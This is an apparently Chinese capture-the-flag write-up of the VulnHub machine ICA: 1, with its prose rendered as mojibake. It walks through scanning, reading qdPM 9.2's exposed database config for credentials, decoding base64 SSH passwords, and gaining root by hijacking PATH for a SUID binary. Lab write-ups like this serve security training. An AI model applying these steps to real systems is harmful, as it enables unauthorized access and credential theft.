## vulnhub åšé¢˜ ICA: 1

### æ‰«æ

```zsh
â”€$ nmap -p 1-65535 -sV 192.168.169.131
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 23:46 EDT
Nmap scan report for 192.168.169.131
Host is up (0.00020s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.48 ((Debian))
3306/tcp  open  mysql   MySQL 8.0.26
33060/tcp open  mysqlx?
1 service unrecognized despite returning data ..........
```

å¼€äº†sshå’Œmysqlï¼Œ80çš„webæ˜¯ä¸€ä¸ªé€šè¿‡é‚®ä»¶ç™»å½•çš„ç•Œé¢ï¼Œæ˜¾ç¤ºè¿™ä¸ªè½¯ä»¶å«åšqdPMï¼Œç‰ˆæœ¬æ˜¯9.2

```zsh
qdPM 9.2 - Cross-site Request Forgery (CSRF)     php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)   php/webapps/50176.txt
```

ç¬¬ä¸€ä¸ªcsrfçš„æ¼æ´æ²¡çœ‹æ‡‚ğŸ˜­ğŸ˜­ğŸ˜­ï¼Œç¬¬äºŒä¸ªè¯´æ˜¯è¦è®¿é—®è¿™ä¸ªç½‘ç«™çš„ä¸€ä¸ªè·¯å¾„å°±èƒ½æ‹¿åˆ°sqlçš„è´¦å·

```
The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download
```

è¿™ä¸ªymlé‡Œå†™äº†è´¦å·æ˜¯qdpmadminï¼Œå¯†ç æ˜¯UcVQCMQk2STVeS6J

ç™»å½•sqlçš„æ—¶å€™è¿˜é‡åˆ°äº†ç‚¹é—®é¢˜ï¼Œç›´æ¥é“¾æ¥ä¼šæŠ¥é”™`ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain`ï¼Œç„¶åæœäº†ä¸€ä¸‹åŠ ä¸ªå‚æ•°ï¼Œ`--ssl-mode=DISABLED`ï¼Œåˆè¯´æ²¡æœ‰è¿™ä¸ªå‚æ•°ï¼Œç„¶ååˆè¯•äº†ä¸€ä¸‹`--skip-ssl`ï¼Œå±…ç„¶å¥½ä½¿äº†ğŸ˜¶â€ğŸŒ«ï¸ï¼ˆä½†è¿™ä¸ªå‚æ•°è¯´æ˜¯å¾ˆæ—§ç‰ˆçš„å‚æ•°ï¼‰

> ç„¶åæˆ‘æ‰“å¼€äº†qdpmè¿™ä¸ªæ•°æ®åº“é‡Œä¸€ä¸ªå«attachmentsçš„è¡¨çš„æ—¶å€™ï¼Œsqlç›´æ¥å´©äº†ï¼Œwebä¹Ÿæ²¡äº†ï¼Œåªèƒ½é‡å¯é¶æœºğŸ˜¢

ç„¶åtqdmé‡Œè¿™ä¸ªuserçš„è¡¨æ˜¯ç©ºçš„ï¼Œå…¶ä»–çš„ä¼¼ä¹ä¹Ÿæ²¡ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œåªèƒ½æ¢ä¸€ä¸ªæ•°æ®åº“çœ‹çœ‹

staffè¿™é‡Œå­˜å‚¨äº†å«åšç”¨æˆ·å’Œå¯†ç çš„è¡¨

```sql
MySQL [staff]> select * from login;
+------+---------+--------------------------+
| id   | user_id | password                 |
+------+---------+--------------------------+
|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |
|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
+------+---------+--------------------------+
5 rows in set (0.001 sec)

MySQL [staff]> select * from user;
+------+---------------+--------+---------------------------+
| id   | department_id | name   | role                      |
+------+---------------+--------+---------------------------+
|    1 |             1 | Smith  | Cyber Security Specialist |
|    2 |             2 | Lucas  | Computer Engineer         |
|    3 |             1 | Travis | Intelligence Specialist   |
|    4 |             1 | Dexter | Cyber Security Analyst    |
|    5 |             2 | Meyer  | Genetic Engineer          |
+------+---------------+--------+---------------------------+

```

å¯†ç æ˜¾ç„¶æ˜¯base64åŠ å¯†è¿‡åçš„ï¼Œç„¶åç”±äºwebæ˜¯è¦ç”¨é‚®ç®±ç™»å½•ï¼Œè‚¯å®šä¸æ˜¯è¿™ä¸ªçš„å¯†ç ï¼Œæ‰€ä»¥åªèƒ½æ˜¯å¼€ç€çš„sshå¯†ç ï¼Œä½†æ˜¯ç™»é™†æ—¶åˆé‡åˆ°äº†é—®é¢˜ï¼ˆæ€ä¹ˆè¿™ä¹ˆå¤šé—®é¢˜ğŸ˜…ï¼‰ï¼Œæœ€åå»çœ‹äº†é¢˜è§£æ‰çŸ¥é“ï¼Œç”¨æˆ·åè¦è½¬æ¢æˆå°å†™ğŸ˜¶â€ğŸŒ«ï¸ğŸ˜¶â€ğŸŒ«ï¸ğŸ˜¶â€ğŸŒ«ï¸

åªæœ‰traviså’Œdexterä¸¤ä¸ªsshèƒ½ç™»é™†çš„

```zsh
travis@debian:/home$ ls
dexter  travis
```

ç„¶ååœ¨travisçš„ç›®å½•å‘ç°äº†ä¸€ä¸ªflag
```zsh
travis@debian:/home/travis$ cat user.txt
ICA{Secret_Project}
```

è€Œdexterçš„ç›®å½•ä¸‹æœ‰è¿›ä¸€æ­¥çš„æç¤º
```zsh
dexter@debian:~$ cat note.txt
It seems to me that there is a weakness while accessing the system.
As far as I know, the contents of executable files are partially viewable.
I need to find out if there is a vulnerability or not.
```

åœ¨optä¸‹æœ‰ä¸€ä¸ª get_access çš„ç¨‹åºï¼Œåæ±‡ç¼–ï¼ˆè‡³äºæ€ä¹ˆæ‰¾åˆ°è¿™é‡Œçš„ï¼Œæœ‰çš„é¢˜è§£è¯´æ˜¯ç”¨`find / -perm -u=s 2>/dev/null`å¯»æ‰¾èƒ½å¤Ÿä»¥rootæƒé™æ‰§è¡Œçš„æ–‡ä»¶ï¼‰

![](/img/pene/5.png)

å¯ä»¥é€šè¿‡æ›¿æ¢catå¯æ‰§è¡Œæ–‡ä»¶ä¸º/bin/bashæ¥è·å–rootæƒé™ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªå«åšcatçš„å†…å®¹ä¸º/bin/bashçš„æ–‡æœ¬ï¼Œç„¶åchmod 777ï¼Œç„¶åæ·»åŠ åˆ°ç¯å¢ƒå˜é‡

```zsh
dexter@debian:/home/dexter$ export PATH=/home/dexter:$PATH
dexter@debian:/home/dexter$ echo $PATH
/home/dexter:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

ä¿è¯ä»–åœ¨/usr/binå‰è¾¹å°±è¡Œã€‚ææƒæˆåŠŸä¹‹åè¦åˆ æ‰æ‰èƒ½æ­£å¸¸è¾“å‡ºï¼ˆä¹Ÿæœ‰è¯´å¯ä»¥ç”¨moreå‘½ä»¤çš„ï¼‰

```zsh
root@debian:/root# rm /home/dexter/cat
root@debian:/root# cat ./root.txt 
ICA{Next_Generation_Self_Renewable_Genetics}
```
